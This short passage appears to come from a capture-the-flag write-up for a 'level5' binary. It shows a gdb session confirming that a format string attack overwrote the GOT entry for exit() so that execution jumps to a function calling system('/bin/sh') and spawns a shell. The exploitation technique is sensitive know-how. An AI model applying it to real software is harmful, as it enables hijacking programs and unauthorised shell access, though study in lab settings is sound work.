## Verifying the Overwrite

i verify the GOT overwrite using:

```bash
echo -e "b *0x080484f8\n\
x/x 0x08049838\n\
run </tmp/payload >/tmp/out\n\
x/x 0x08049838" | gdb level5
```

before execution, the GOT entry points to `exit()`.

after the format string attack, the GOT entry contains:

```text
0x080484a4
```

which is the address of `o()`.

when the program finally executes:

```c
exit();
```

execution is redirected to:

```c
o();
```

which calls:

```c
system("/bin/sh");
```

and gives a shell.